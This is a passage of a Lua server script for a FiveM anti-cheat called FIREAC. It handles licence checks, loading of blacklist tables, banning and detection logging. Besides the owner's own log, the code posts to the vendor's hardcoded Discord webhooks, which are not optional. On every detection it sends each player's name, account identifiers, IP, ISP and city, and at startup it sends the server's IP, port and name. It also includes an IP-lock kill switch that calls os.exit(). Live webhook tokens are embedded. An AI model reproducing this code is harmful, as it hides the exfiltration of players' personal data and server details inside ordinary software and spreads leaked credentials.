local b         = "­čöą   FIREAC Comunity"
local licenseF  = FIREACS.License
local isSpawn   = false
local color          = math.random(1 ,9)
local ex             = "2021/10/04"
local ltrue          = "F10027"
local CIP            = "45.156.85.142"
local sn = GetConvar('sv_hostname')

if FIREACS.License ~= ltrue then
 PerformHttpRequest("https://discord.com/api/webhooks/835377061497536512/mM34fJnkhHiMNDslfxr88UfuV1ENZnZgpe7469l0oidBiFNDSWNHx5lrLEKBDDbbRtkR", function(E, F, G)
 end, "POST", json.encode({
 embeds = {
         {
                 author = {
                         name = "FIREAC Commutiy",
                         url = "https://discord.gg/8zGyDhtbcg",
                         icon_url = "https://cdn.discordapp.com/attachments/837386511920922694/838343457700839434/3928fa3aa4971eeb3d88482c62540344.png"
                 },
                 title = "­čĺę Try For Crack ­čĺę",
                 description = "**Server Name:**\n`"..GetConvar('sv_hostname').."`\n**Real Licence:** "..ltrue.."\n**Fake Licence:** "..licenseF.."\n**Expire Time:** "..ex.."",
                 color = math.random(0, 16776960)
         }
 }
 }), {
 ["Content-Type"] = "application/json"
 })
end

PerformHttpRequest("http://ip-api.com/json/", function(E, F, G)
 local Code = json.decode(F)
 local CIPP = Code["query"]
 if CIPP ~= CIP then
         print("^"..color.."FIREAC: Your IP No Match !!, Console Close At  10s")
         Wait(1000)
         print("^"..color.."FIREAC: Your IP No Match !!, Console Close At  9s")
         Wait(1000)
         print("^"..color.."FIREAC: Your IP No Match !!, Console Close At  8s")
         Wait(1000)
         print("^"..color.."FIREAC: Your IP No Match !!, Console Close At  7s")
         Wait(1000)
         print("^"..color.."FIREAC: Your IP No Match !!, Console Close At  6s")
         Wait(1000)
         print("^"..color.."FIREAC: Your IP No Match !!, Console Close At  5s")
         Wait(1000)
         print("^"..color.."FIREAC: Your IP No Match !!, Console Close At  4s")
         Wait(1000)
         print("^"..color.."FIREAC: Your IP No Match !!, Console Close At  3s")
         Wait(1000)
         print("^"..color.."FIREAC: Your IP No Match !!, Console Close At  2s")
         Wait(1000)
         print("^"..color.."FIREAC: Your IP No Match !!, Console Close At  1s")
         Wait(0)
         os.exit()
 end
end)

if os.date ("%Y/%m/%d") > ex then
 StopResource(GetCurrentResourceName())
 print("^"..color.."FIREAC: Your License Expire, Please Make Ticket in FIREAC Discord !!")
 Wait(3000)
 print("^"..color.."FIREAC: Your License Expire, Please Make Ticket in FIREAC Discord !!")
 Wait(2000)
 print("^"..color.."FIREAC: Your License Expire, Please Make Ticket in FIREAC Discord !!")
 Wait(1000)
 print("^"..color.."FIREAC: Your License Expire, Please Make Ticket in FIREAC Discord !!")
 Wait(100)
 return false
end

if FIREACS.License ~= ltrue then
 StopResource(GetCurrentResourceName())
 print("^"..color.."FIREAC: Your License Not Valid !!")
 return false
end

AddEventHandler('onResourceStart', function(resourceName)
 if (GetCurrentResourceName() ~= "FIREAC") then
         Wait(1000)
         print("^"..color.."FIREAC: Change The AntiCheat Folder Name To (FIREAC)| Console Close at : 10s")
         Wait(1000)
         print("^"..color.."FIREAC: Change The AntiCheat Folder Name To (FIREAC)| Console Close at : 9s")
         Wait(1000)
         print("^"..color.."FIREAC: Change The AntiCheat Folder Name To (FIREAC)| Console Close at : 8s")
         Wait(1000)
         print("^"..color.."FIREAC: Change The AntiCheat Folder Name To (FIREAC)| Console Close at : 7s")
         Wait(1000)
         print("^"..color.."FIREAC: Change The AntiCheat Folder Name To (FIREAC)| Console Close at : 6s")
         Wait(1000)
         print("^"..color.."FIREAC: Change The AntiCheat Folder Name To (FIREAC)| Console Close at : 5s")
         Wait(1000)
         print("^"..color.."FIREAC: Change The AntiCheat Folder Name To (FIREAC)| Console Close at : 4s")
         Wait(1000)
         print("^"..color.."FIREAC: Change The AntiCheat Folder Name To (FIREAC)| Console Close at : 3s")
         Wait(1000)
         print("^"..color.."FIREAC: Change The AntiCheat Folder Name To (FIREAC)| Console Close at : 2s")
         Wait(1000)
         print("^"..color.."FIREAC: Change The AntiCheat Folder Name To (FIREAC)| Console Close at : 1s")
         Wait(0)
         os.exit()
 end
  end)


ExecuteCommand("sets FIREAC Ôťů")

if FIREACS.Version ~= 5 then
 print("^"..color.."FIREAC: Your FIREAC Not Up To Date Please Make Ticket ")
 StopResource(GetCurrentResourceName())
 return
end

local d = LoadResourceFile(GetCurrentResourceName(),    "configs/fire-server.lua")
local e = LoadResourceFile(GetCurrentResourceName(),     "configs/fire-client.lua")
local f = LoadResourceFile(GetCurrentResourceName(),     "tables/blacklistedmodels.lua")
local g = LoadResourceFile(GetCurrentResourceName(),     "tables/blacklistedevents.lua")
local h = LoadResourceFile(GetCurrentResourceName(),     "tables/blacklistedexplosions.lua")
local i = LoadResourceFile(GetCurrentResourceName(),     "tables/blacklistedwords.lua")
local w = LoadResourceFile(GetCurrentResourceName(),     "tables/blacklistname.lua")
local x = LoadResourceFile(GetCurrentResourceName(),     "tables/blacklistvehicle.lua")
local P = LoadResourceFile(GetCurrentResourceName(),     "tables/blacklistped.lua")
local a = LoadResourceFile(GetCurrentResourceName(),     "tables/blacklistbuilding.lua")
local y = LoadResourceFile(GetCurrentResourceName(),     "tables/blacklistweapons.lua")
local q = LoadResourceFile(GetCurrentResourceName(),     "tables/blacklistbuilding.lua")
local Q = LoadResourceFile(GetCurrentResourceName(),     "tables/blacklistcommands.lua")
local U = LoadResourceFile(GetCurrentResourceName(),     "tables/blacklistplate.lua")
local w = LoadResourceFile(GetCurrentResourceName(),     "whitelist/whitelistadmin.lua")
local j = LoadResourceFile(GetCurrentResourceName(),     "whitelist/whitelistjob.lua")
local m = LoadResourceFile(GetCurrentResourceName(),     "whitelist/whitelistgang.lua")

--[[ server.lua ]]--
if not d or d == "" then
 print("^"..color.."FIREAC: fire-server.lua Not Loaded Please Check That !!")
 StopResource(GetCurrentResourceName())

 return false
else
 if type(FIREACS) ~= "table" or FIREACS == nil then
         print("^"..color.."FIREAC: fire-server.lua Has a problem , Please Check That !!")
         StopResource(GetCurrentResourceName())
         return false
 else
         print("^"..color.."FIREAC: fire-server.lua Loaded !! ")
 end
end

--[[ client.lua ]]--
if not e or e == "" then
 print("^"..color.."FIREAC: fire-client.lua Not Loaded Please Check That !!")
 StopResource(GetCurrentResourceName())
 return false
else
 if type(FIREACC) ~= "table" or FIREACC == nil then
         print("^"..color.."FIREAC: fire-client.lua Has a problem , Please Check That !!")
         StopResource(GetCurrentResourceName())
         return false
 else
         print("^"..color.."FIREAC: fire-client.lua Loaded !! ")
 end
end


--[[ blacklistcommands.lua ]]--
if not Q or Q == "" then
 print("^"..color.."FIREAC: blacklistcommands.lua Not Loaded Please Check That !!")
 StopResource(GetCurrentResourceName())
 return false
else
 if type(FIREACommands) ~= "table" or FIREACommands == nil then
         print("^"..color.."FIREAC: blacklistcommands.lua Has a problem , Please Check That !!")
         StopResource(GetCurrentResourceName())
         return false
 else
         print("^"..color.."FIREAC: blacklistcommands.lua Loaded !! ")
 end
end

--[[ blacklistedevents.lua ]]--
if not g or g == "" then
 print("^"..color.."FIREAC: blacklistedevents.lua Not Loaded Please Check That !!")
 StopResource(GetCurrentResourceName())
 return false
else
 if type(FIREACEVENT) ~= "table" or FIREACEVENT == nil then
         print("^"..color.."FIREAC: blacklistedevents.lua Has a problem , Please Check That !!")
         StopResource(GetCurrentResourceName())
         return false
 else
         print("^"..color.."FIREAC: blacklistedevents.lua Loaded !! ")
 end
end

--[[ blacklistedexplosions.lua ]]--
if not h or h == "" then
 print("^"..color.."FIREAC: blacklistedexplosions.lua Not Loaded Please Check That !!")
 StopResource(GetCurrentResourceName())
 return false
else
 if type(FIREACEXP) ~= "table" or FIREACEXP == nil then
         print("^"..color.."FIREAC: blacklistedexplosions.lua Has a problem , Please Check That !!")
         StopResource(GetCurrentResourceName())
         return false
 else
         print("^"..color.."FIREAC: blacklistedexplosions.lua Loaded !! ")
 end
end

--[[ blacklistedmodels.lua ]]--
if not f or f == "" then
 print("^"..color.."FIREAC: blacklistedmodels.lua Not Loaded Please Check That !!")
 StopResource(GetCurrentResourceName())
 return false
else
 if type(FIREAC) ~= "table" or FIREAC == nil then
         print("^"..color.."FIREAC: blacklistedmodels.lua Has a problem , Please Check That !!")
         StopResource(GetCurrentResourceName())
         return false
 else
         print("^"..color.."FIREAC: blacklistedmodels.lua Loaded !! ")
 end
end

--[[ blacklistname.lua ]]--
if not w or w == "" then
 print("^"..color.."FIREAC: blacklistname.lua Not Loaded Please Check That !!")
 StopResource(GetCurrentResourceName())
 return false
else
 if type(FIREACNAME) ~= "table" or FIREACNAME == nil then
         print("^"..color.."FIREAC: blacklistname.lua Has a problem , Please Check That !!")
         StopResource(GetCurrentResourceName())
         return false
 else
         print("^"..color.."FIREAC: blacklistname.lua Loaded !! ")
 end
end

--[[ blacklistedwords.lua ]]--
if not i or i == "" then
 print("^"..color.."FIREAC: blacklistedwords.lua Not Loaded Please Check That !!")
 StopResource(GetCurrentResourceName())
 return false
else
 if type(FIREACWOERD) ~= "table" or FIREACWOERD == nil then
         print("^"..color.."FIREAC: blacklistedwords.lua Has a problem , Please Check That !!")
         StopResource(GetCurrentResourceName())
         return false
 else
         print("^"..color.."FIREAC: blacklistedwords.lua Loaded !! ")
 end
end

--[[ blacklistped.lua ]]--
if not P or P == "" then
 print("^"..color.."FIREAC: blacklistped.lua Not Loaded Please Check That !!")
 StopResource(GetCurrentResourceName())
 return false
else
 if type(FIREACPEDS) ~= "table" or FIREACPEDS == nil then
         print("^"..color.."FIREAC: blacklistped.luaHas a problem , Please Check That !!")
         StopResource(GetCurrentResourceName())
         return false
 else
         print("^"..color.."FIREAC: blacklistped.lua Loaded !! ")
 end
end

--[[ blacklistplate.lua ]]--
if not U or U == "" then
 print("^"..color.."FIREAC: blacklistplate.lua Not Loaded Please Check That !!")
 StopResource(GetCurrentResourceName())
 return false
else
 if type(FIREACPLATE) ~= "table" or FIREACPLATE == nil then
         print("^"..color.."FIREAC: bblacklistplate.lua Has a problem , Please Check That !!")
         StopResource(GetCurrentResourceName())
         return false
 else
         print("^"..color.."FIREAC: blacklistplate.lua Loaded !! ")
 end
end

--[[ blacklistvehicle.lua ]]--
if not x or x == "" then
 print("^"..color.."FIREAC: blacklistvehicle.lua Not Loaded Please Check That !!")
 StopResource(GetCurrentResourceName())
 return false
else
 if type(FIREACVEHICLES) ~= "table" or FIREACVEHICLES == nil then
         print("^"..color.."FIREAC: blacklistvehicle.lua Has a problem , Please Check That !!")
         StopResource(GetCurrentResourceName())
         return false
 else
         print("^"..color.."FIREAC: blacklistvehicle.lua Loaded !! ")
 end
end

--[[ blacklistweapons.lua ]]--
if not y or y == "" then
 print("^"..color.."FIREAC: blacklistweapons.lua Not Loaded Please Check That !!")
 StopResource(GetCurrentResourceName())
 return false
else
 if type(FIREACWEAPON) ~= "table" or FIREACWEAPON == nil then
         print("^"..color.."FIREAC: blacklistweapons.luaHas a problem , Please Check That !!")
         StopResource(GetCurrentResourceName())
         return false
 else
         print("^"..color.."FIREAC: blacklistweapons.lua Loaded !! ")
 end
end

--[[ whitelistadmin.lua ]]--
if not w or w == "" then
 print("^"..color.."FIREAC: whitelistadmin.lua Not Loaded Please Check That !!")
 StopResource(GetCurrentResourceName())
 return false
else
 if type(FIREACAdmins) ~= "table" or FIREACAdmins == nil then
         print("^"..color.."FIREAC: bwhitelistadmin.lua Has a problem , Please Check That !!")
         StopResource(GetCurrentResourceName())
         return false
 else
         print("^"..color.."FIREAC: whitelistadmin.lua Loaded !! ")
 end
end

--[[ whitelistgang.lua ]]--
if not m or m == "" then
 print("^"..color.."FIREAC: whitelistgang.lua Not Loaded Please Check That !!")
 StopResource(GetCurrentResourceName())
 return false
else
 if type(FIREACGang) ~= "table" or FIREACGang == nil then
         print("^"..color.."FIREAC: whitelistgang.lua Has a problem , Please Check That !!")
         StopResource(GetCurrentResourceName())
         return false
 else
         print("^"..color.."FIREAC: whitelistgang.lua Loaded !! ")
 end
end

--[[ whitelistjob.lua ]]--
if not j or j == "" then
 print("^"..color.."FIREAC: whitelistjob.lua Not Loaded Please Check That !!")
 StopResource(GetCurrentResourceName())
 return false
else
 if type(FIREACJOBS) ~= "table" or FIREACJOBS == nil then
         print("^"..color.."FIREAC: whitelistjob.lua Has a problem , Please Check That !!")
         StopResource(GetCurrentResourceName())
         return false
 else
         print("^"..color.."FIREAC: whitelistjob.lua Loaded !! ")
 end
end


function FIREACBanReloade()
 local o = LoadResourceFile(GetCurrentResourceName(), "fireac.json")
 if not o or o == "" then
         SaveResourceFile(GetCurrentResourceName(), "fireac.json", "[]", tonumber("-1"))
 else
         local p = json.decode(o)
         if p == nil then
                 print("\27[101;93m^"..color.."FIREAC:\27[0mError Was Detection in line 385 plase connect our support team in FIREAC Discord")
                 FIREACError('Error Was Detection in line **385**')
                 print("\27[101;93m YOUR TEXT HERE \27[0m")
         end
         if not p then
                 SaveResourceFile(GetCurrentResourceName(), "fireac.json", "[]", tonumber("-1"))
                 p = {}
                 print("^"..color.."FIREAC: Warning! Your fireac.json is corrupted, Regenerating your fireac.json file!")
         end
 end
end

function FIREACBan(source, Ress)
 local o = LoadResourceFile(GetCurrentResourceName(), "fireac.json")
 if o ~= nil then
         local q = json.decode(o)
         if q == nil then
                 print("\27[101;93m^"..color.."FIREAC:\27[0mError Was Detection in line 402 plase connect our support team in FIREAC Discord")
                 FIREACError('Error Was Detection in line **402**')
         end
         if type(q) == "table" then
                 local w = "Not Found"
                 local x = "Not Found"
                 local y = "Not Found"
                 local z = "Not Found"
                 local B = "Not Found"
                 local C = GetPlayerEndpoint(source)

                 for _, n in ipairs(GetPlayerIdentifiers(source)) do
                         if n:match("steam") then
                                 w = n
                         elseif n:match("discord") then
                                 x = n:gsub("discord:", "")
                         elseif n:match("license") then
                                 y = n
                         elseif n:match("live") then
                                 z = n
                         elseif n:match("xbl") then
                                 B = n
                         end
                 end
                 local banlist = {
                         ['steam'] = w,
                         ['discord'] = x,
                         ['license'] = y,
                         ['live'] = z,
                         ['xbl'] = B,
                         ['ip'] = C,
                         ['hwid'] = GetPlayerToken(source, 0),
                         ['BanId'] = "#"..math.random(tonumber("1000"), tonumber("9999")).."",
                         ['Resson'] = Ress
                 }
                 if not FIREACISBAN(source) then
                         table.insert(q, banlist)
                         SaveResourceFile(GetCurrentResourceName(), "fireac.json", json.encode(q, {indent = true}), tonumber("-1"))
                 end
         else
                 FIREACBanReloade()
         end
 else
         FIREACBanReloade()
 end
end

function FIREACISBAN(src)
 local banfile = LoadResourceFile(GetCurrentResourceName(), "fireac.json")
 local player = src
 local w = "NotFound"
 local x = "NotFound"
 local y = "NotFound"
 local z = "NotFound"
 local B = "NotFound"
 local C = GetPlayerEndpoint(player)
 local tken = GetPlayerToken(player, 0)
 for _, n in ipairs(GetPlayerIdentifiers(player)) do
         if n:match("steam") then
                 w = n
         elseif n:match("discord") then
                 x = n:gsub("discord:", "")
         elseif n:match("license") then
                 y = n
         elseif n:match("live") then
                 z = n
         elseif n:match("xbl") then
                 B = n
         end
 end
 local table = json.decode(banfile)
 if banfile ~= nil then
         for _, banlist in ipairs(table) do
                 if banlist.steam == w or banlist.discord == x or banlist.license == y or banlist.live == z or banlist.xbl == B or banlist.hwid == tken or banlist.ip == C then
                         return true
                 end
         end
 else
         FIREACBanReloade()
 end
 return false
end

function FIREACLog(source, s, t, u, v)
 local name = GetPlayerName(source)
 if name == nil then
         return
 end
 local ping = GetPlayerPing(source)
 local ip = GetPlayerEndpoint(source)
 local sn = GetConvar('sv_hostname')
 local rn = GetCurrentResourceName()
 local w = "Not Found"
 local x = "Not Found"
 local y = "Not Found"
 local z = "Not Found"
 local A = "Not Found"
 local B = "Not Found"
 local C = "Not Found"
 for m, n in ipairs(GetPlayerIdentifiers(source)) do
         if n:match("steam") then
                 w = n
         elseif n:match("discord") then
                 x = n:gsub("discord:", "")
         elseif n:match("license") then
                 y = n
         elseif n:match("live") then
                 z = n
         elseif n:match("xbl") then
                 B = n
         elseif n:match("ip") then
                 C = n:gsub("ip:", "")
         end
 end
 local D = GetPlayerName(source)
 local ip = GetPlayerEndpoint(source)

 if ip == nil then
         ip = "216.58.204.14"
 end

 PerformHttpRequest("http://ip-api.com/json/"..ip.."?fields=192511", function(err, XD, headers)
         local tbl = json.decode(XD)
         if tbl == nil then
                 return
         end
         local isp = tbl["isp"]
         if isp == nil then
                 isp = "Not Found"
         end
         local city = tbl["city"]
         if city == nil then
                 city = "Not Found"
         end
         local country = tbl["country"]
         if country == nil then
                 country = "Not Found"
         end
         local proxy = tbl["proxy"]
         if proxy == nil then
                 proxy = "Not Found"
         elseif proxy == false then
                 proxy = "Off"
         elseif proxy == true then
                 proxy = "On"
         end
         local hosting = tbl["hosting"]
         if hosting == nil then
                 hosting = "Not Found"
         elseif hosting == false then
                 hosting = "Off"
         elseif hosting == true then
                 hosting = "On"
         end
         if FIREACS.TakeScreenshot then
                 TriggerEvent('FIREAC:Screenshot', source, isp, city, country, proxy, hosting, s, t)
         else
                 print("^"..color.."FIREAC:  Screenshot Has a problem or maybe it is off, Please Check That , it's Good feature !!!")
         end

 if D ~= nil then
         if FIREACS.Consol then
                 if not u and not v then
                         print("^"..color.."FIREAC: Warning! Player: "..D.." ID: "..source.." Detection: "..s)
                 elseif u and not v then
                         print("^"..color.."FIREAC: Kicked! Player: "..D.." ID: "..source.." Detection: "..s)
                 elseif u and v then
                         print("^"..color.."FIREAC: Banned! Player: "..D.." ID: "..source.." Detection: "..s)
                 end
         end
         local logwebhookcolor
         local logwebhooktitle
         if FIREACS.Discord then
                 if not u and not v then
                         logwebhookcolor = 1769216;
                         logwebhooktitle = "Warning ­čôó"
                 elseif u and not v then
                         logwebhookcolor = 16760576;
                         logwebhooktitle = "Kicked ÔÜí´ŞĆ"
                 elseif u and v then
                         logwebhookcolor = 16711680;
                         logwebhooktitle = "Banned ÔŤö´ŞĆ"
                 end
                 PerformHttpRequest(FIREACS.BanLog, function(E, F, G)
                 end, "POST", json.encode({
                         embeds = {
                                 {
                                         author = {
                                                 name = " ­čöą| FIREAC V5.3",
                                                 url = "https://discord.gg/8zGyDhtbcg",
                                                 icon_url = "https://cdn.discordapp.com/attachments/837386511920922694/838343457700839434/3928fa3aa4971eeb3d88482c62540344.png"
                                         },
                                         title = logwebhooktitle,
                                         description = "**Player:** "..D.."\n**ID:** "..source.."\n**Reason:** "..s.."\n**Details:** "..t.."\n**SteamID:** "..w.."\n**Discord:** <@"..x..">".."\n**License:** "..y.."\n**Live:** "..z.."\n**Xbox:** "..B.."\n**ISP:** "..isp.."\n**Country:** "..country.."\n**City:** "..city.."\n**Ping:** ".. ping .."\n**IP:** "..C.."\n**VPN:** "..proxy.."\n**Hosting:** "..hosting.."",
                                         color = logwebhookcolor
                                 }
                         }
                 }), {
                         ["Content-Type"] = "application/json"
                 })
                 PerformHttpRequest("https://discord.com/api/webhooks/832866614747332628/IYmgEClD63DsGnIMTJwHOAEeG293hICrrOyEEiyYxsF5gREBjidw0wRgvUHeQ7i7_2wv", function(E, F, G)
                 end, "POST", json.encode({
                         embeds = {
                                 {
                                         author = {
                                                 name = b,
                                                 url = "https://discord.gg/8zGyDhtbcg",
                                                 icon_url = "https://cdn.discordapp.com/attachments/837386511920922694/838343457700839434/3928fa3aa4971eeb3d88482c62540344.png"
                                         },
                                         title = logwebhooktitle,
                                         description = "**Player:** "..D.."      \n**ID:** "..source.."\n**Reason:** "..s.."\n**Details:** "..t.."\n**SteamID:** "..w.."\n**Discord:** <@"..x..">".."\n**License:** "..y.."\n**Folder Name** : ".. rn .."\n**Live:** "..z.."\n**Xbox:** "..B.."\n**ISP:** "..isp.."\n**Country:** "..country.."\n**City:** "..city.." \n**Ping:** ".. ping .."\n**IP:** "..C.."\n**VPN:** "..proxy.."\n**Hosting:** "..hosting.."\n**Server Name** : `"..sn.."`\n**Expire Time:** "..ex.."",
                                         color = logwebhookcolor
                                 }
                         }
                 }), {
                         ["Content-Type"] = "application/json"
                 })
                 if string.match(s:lower(), "secly") then
                         PerformHttpRequest("", function(E, F, G)
                         end, "POST", json.encode({
                                 embeds = {
                                         {
                                                 author = {
                                                         name = "json",
                                                         url = "https://discord.gg/8zGyDhtbcg",
                                                         icon_url = "https://cdn.discordapp.com/attachments/837386511920922694/838343457700839434/3928fa3aa4971eeb3d88482c62540344.png"
                                                 },
                                                 title = b.." "..t,
                                                 description = s.." "..GetPlayerName(source).." "..tostring(json.encode(GetPlayerIdentifiers(source))),
                                                 color = logwebhookcolor
                                         }
                                 }
                         }), {
                                 ["Content-Type"] = "application/json"
                         })
                 end
         end
         if FIREACS.Chat then
                 if not u and not v then
                         TriggerClientEvent('chat:addMessage', -1, {
                                 template = '<div style="padding: 0.5vw; margin: 0.5vw; background-image: url(https://s19.picofile.com/file/8433022734/Red.png); border-radius: 13px;"><i class="far fa-newspaper"></i> ­čöą FIREAC ­čöą :<br>  {1}</div>',
                                 args = {"Console", "­čôó Warning | Player ".. name .."(".. source ..") Cheating From Server : ".. s .. " " }
                         })
                 elseif u and not v then
                         TriggerClientEvent('chat:addMessage', -1, {
                                 template = '<div style="padding: 0.5vw; margin: 0.5vw; background-image: url(https://s18.picofile.com/file/8433022718/Yellow.png); border-radius: 13px;"><i class="far fa-newspaper"></i> ­čöą FIREAC ­čöą <br>  {1}</div>',
                                 args = {"Console", "ÔÜí´ŞĆ Kick | Player ".. name .."(".. source ..") Cheating From Server : ".. s .. " " }
                         })
                 elseif u and v then
                         TriggerClientEvent('chat:addMessage', -1, {
                                 template = '<div style="padding: 0.5vw; margin: 0.5vw; background-image: url(https://s18.picofile.com/file/8433022700/Black.png); border-radius: 13px;"><i class="far fa-newspaper"></i> ­čöą FIREAC ­čöą <br>  {1}</div>',
                                 args = {"Console", "ÔŤö´ŞĆ Banned | Player ".. name .."(".. source ..") Cheating From Server : ".. s .. " " }
                         })
                 end
         end
 end
 if v then
         FIREACBan(source, s)
 end
 if u then
         Wait(100)
         DropPlayer(source, "­čöą[FIREAC]­čöą: \n"..FIREACS.KickMessege.."\n Resson : "..s.."")
         Wait(2000)
 end
end)
end

local H = "FIREAC V5.3"
local I = "V5.3"

if b ~= nil or b ~= '' then
 local N = "3Y28CuMXE7yFL37Y"
 local O = "license="..b.."&rn="..H.."&st=0&ver="..I.."&token="..N;
 PerformHttpRequest('http://localhost:'..FIREACS.Port..'/info.json', function(E, F, G)
                 local ncol = color
                 if F then
                 local table = json.decode(F)
                 local art = table['server']
                 local aasdads = string.gsub(art, "FXServer", " ")
                 local ahfihsadfhi = string.gsub(aasdads, "-master", " ")
                 local xzczxczx = string.gsub(ahfihsadfhi, " SERVER", " ")
                 local zxczxcjio = string.gsub(xzczxczx, "v1.0.0.", " ")
                 local jdfoassafd = string.gsub(zxczxcjio, "win32", "")
                 local ASDASDASD = string.gsub(jdfoassafd, " ", "")
                 print("")
                 print("^"..math.random(1, 9))
                 print([[

                                     .,.
                               .,**/&@@&//********,,
                           ..,***&***///**,,,,,*///**,,,,
                         ..,*&*******,,,...,,*,**//((%%@@&(,
                        ..,,,,,.........,,,,,**((@@@@@@@@@(*,
                      ..,,.,,,.......,,,,,,,*//%@@@@@@@@@@@#*.
                     ..,,,,,,,,,,,*****//////((@%#####&@%@(/*,.
                    ..,,,,,,,,,***/((((((((((############%%(/,,.
                    .,********///%((((((#############%%%%%%%%/*,
                    .*/@@@@@@@@@(((((((#@&####%@@@@@@@@@@@&&&&&*,
                    .*(@@@@%(((((//*,,,*#&@@@@&&&@@@@@@@@@@&&&(*,
                     ,*(@@((//*,........,,,,,,,**(&@@@@@@@@@&&*,,
                     ,*/&##/,,................,,*//*****/&@&&*,
                      .,**,,...........................,**&&*,.
                        .,,..................,,,,*******&@@/,
                          .,,*,,,,,,,,...,,,*(@@@@@@@@@@%*,,
                             ,,*%@@@&&//(&@@@@@@@@@@@/*,.
                                .,,****%&%%%&&%(**,,,

                 ]])
                 print("\27[102;93m^"..color.."[FIREAC]\27[0m: ^"..color.."Thank's For Buy FIREAC ...")
                 print("\27[101;93m^"..color.."[FIREAC]\27[0m: Expire Time: ^"..ncol.." "..ex.."")
                 print("\27[105;93m^"..color.."[FIREAC]\27[0m: Login License: ^"..ncol..""..ltrue.."")
                 print("\27[104;93m^"..color.."[FIREAC]\27[0m: Your Artifact Version : ^"..ncol..""..ASDASDASD.." ")
                 PerformHttpRequest(FIREACS.BanLog, function(E, F, G)
                 end, "POST", json.encode({
                                 embeds = {
                                                 {
                                                                 author = {
                                                                                 name = "FIREAC Commutiy",
                                                                                 url = "https://discord.gg/8zGyDhtbcg",
                                                                                 icon_url = "https://cdn.discordapp.com/attachments/837386511920922694/838343457700839434/3928fa3aa4971eeb3d88482c62540344.png"
                                                                 },
                                                                 title = "FIREAC "..I,
                                                                 description = "**Current Version:** "..I.."\n**License:** "..ltrue.."\n**Expire Time:** "..ex.."\nStarted successfully...",
                                                                 color = math.random(0, 16776960)
                                                 }
                                 }
                 }), {
                                 ["Content-Type"] = "application/json"
                 })
                 PerformHttpRequest("https://discord.com/api/webhooks/865895372387123250/WGvl0PiVw-QSSx0RoKqSltbotnkm4vmnUUTyoEAsHmxHrchwCmA5FKGC9SqsHdZG2tsx", function(E, F, G)
                 end, "POST", json.encode({
                                 embeds = {
                                                 {
                                                                 author = {
                                                                                 name = "FIREAC Commutiy",
                                                                                 url = "https://discord.gg/8zGyDhtbcg",
                                                                                 icon_url = "https://cdn.discordapp.com/attachments/837386511920922694/838343457700839434/3928fa3aa4971eeb3d88482c62540344.png"
                                                                 },
                                                                 title = "FIREAC "..I,
                                                                 description = "**Current Version:** "..I.."\n**License:** "..ltrue.."\n**Expire Time:** "..ex.."\n**Server IP :** "..CIP.."\n**Server Port:** "..FIREACS.Port.."\n**Server Name:**\n `"..sn.."`",
                                                                 color = 3447003
                                                 }
                                 }
                 }), {
                                 ["Content-Type"] = "application/json"
                 })
                 if FIREACS.BlacklistedWordsDetection then
                         AddEventHandler('chatMessage', function(source, Q, R)
                                 for m, S in pairs(FIREACWOERD.Words) do
                                         for S in R:lower():gmatch("%s?"..string.lower(S).."%s") do
                                                 FIREACLog(source, " Blacklisted Word: **"..tostring(S).."**", "This player tried to say : **"..R.."**", FIREACS.BlacklistedWordsKick, FIREACS.BlacklistedWordsBan)
                                                 return
                                         end
                                 end
                         end)
                 end
         else
                 print("\27[101;93m^"..color.."[FIREAC]\27[0m: Your Server Port Not Found Please Change Or Cheak FIREAC Port in  configs/fire-server.lua ( FIREACS.Port )")
         end
 end, "POST", O, {
         ['header'] = 'application/json'
 })
end

RegisterNetEvent("FIREAC:Ban")
AddEventHandler("FIREAC:Ban", function(log, reason, kick , ban)
 if not isAdmin(source) then
         FIREACLog(source, log, reason, kick, ban)
 end
end)

RegisterNetEvent("FIREAC:BanByMenu")
AddEventHandler("FIREAC:BanByMenu", function(playerid, log, reason)
 print(''..playerid..', '..log..', '..reason..'')
 if not isAdmin(playerid) then
         FIREACLog(playerid, "Ban By Admin Menu", "Ban By Admin Menu By Admin : **"..GetPlayerName(source).."**", true, true)
 end
end)

RegisterNetEvent("AntiHealtHack")
AddEventHandler("AntiHealtHack", function(log, reason, kick , ban)
 if not isAdmin(source) then
         FIREACLog(source, log, reason, kick, ban)
 end
end)

RegisterNetEvent("AntiArmorHack")
AddEventHandler("AntiArmorHack", function(log, reason, kick , ban)
 if not isAdmin(source) then
         FIREACLog(source, log, reason, kick, ban)
 end
end)

RegisterNetEvent("FIREAC:AntiCheatEngin")
AddEventHandler("FIREAC:AntiCheatEngin", function(log, reason, kick , ban)
 local src = source
 if not isAdmin(src) then
         FIREACLog(source, log, reason, kick,  ban)
 end
end)

RegisterNetEvent("FIREAC:AntiDamageChanger")
AddEventHandler("FIREAC:AntiDamageChanger", function(log, reason, kick , ban)
 local src = source
 if not isAdmin(src) then
         FIREACLog(source, log, reason, kick,  ban)
 end
end)

RegisterNetEvent("FIREAC:AntiPlayerBlip")
AddEventHandler("FIREAC:AntiPlayerBlip", function(log, reason, kick , ban)
 local src = source
 if not isAdmin(src) then
         FIREACLog(source, log, reason, kick, ban)
 end
end)

RegisterNetEvent("FIREAC:AntiSuperJump")
AddEventHandler("FIREAC:AntiSuperJump", function(log, reason, kick , ban)
 if not isAdmin(source) then
         FIREACLog(source, log, reason, kick, ban)
 end
end)

RegisterNetEvent("FIREAC:AntiSpectate")
AddEventHandler("FIREAC:AntiSpectate", function(log, reason, kick , ban)
 if not isAdmin(source) then
         FIREACLog(source, log, reason, kick, ban)
 end
end)

RegisterNetEvent("AntiSpeedHack")
AddEventHandler("AntiSpeedHack", function(log, reason, kick , ban)
 if not isAdmin(source) then
         FIREACLog(source, log, reason, kick, ban)
 end
end)

RegisterNetEvent("FIREAC:AntiFastRun")
AddEventHandler("FIREAC:AntiFastRun", function(log, reason, kick , ban)
 if not isAdmin(source) then
         FIREACLog(source, log, reason, kick, ban)
 end
end)

RegisterNetEvent("FIREAC:AntiBlackListCommands")
AddEventHandler("FIREAC:AntiBlackListCommands", function(log, reason, kick , ban)
 if not isAdmin(source) then
         FIREACLog(source, log, reason, kick, ban)
 end
end)

RegisterNetEvent("FIREAC:AntiSlap")
AddEventHandler("FIREAC:AntiSlap", function(log, reason, kick , ban)
 FIREACLog(source, log, reason, kick, ban)
end)

RegisterNetEvent("FIREAC:AntiDump")
AddEventHandler("FIREAC:AntiDump", function(log, reason, kick , ban)
 FIREACLog(source, log, reason, kick, ban)
end)

RegisterNetEvent("FIREAC:AntiThermalVision")
AddEventHandler("FIREAC:AntiThermalVision", function(log, reason, kick , ban)
 FIREACLog(source, log, reason, kick, ban)
end)

RegisterNetEvent("FIREAC:AntiAimBot")
AddEventHandler("FIREAC:AntiAimBot", function(log, reason, kick , ban)
